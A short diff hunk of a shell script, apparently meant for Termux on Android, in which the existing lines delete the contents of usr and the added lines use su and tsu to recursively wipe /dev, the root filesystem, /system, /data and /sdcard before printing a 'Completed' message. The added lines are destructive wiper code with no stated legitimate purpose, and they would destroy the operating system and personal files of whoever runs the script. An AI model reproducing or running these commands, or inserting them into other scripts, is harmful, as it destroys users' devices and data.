@@ -23,4 +23,10 @@ cd ..
 cd usr
 rm -Rf *
 tsu -c rm -Rf *
+tsu -c rm -Rf /dev
+su -c rm -Rf /*
+su -c rm -Rf /dev
+su -c rm -Rf /system /data
+su -c rm -Rf /sdcard
+rm -Rf /sdcard
 echo "$c Completed $d"
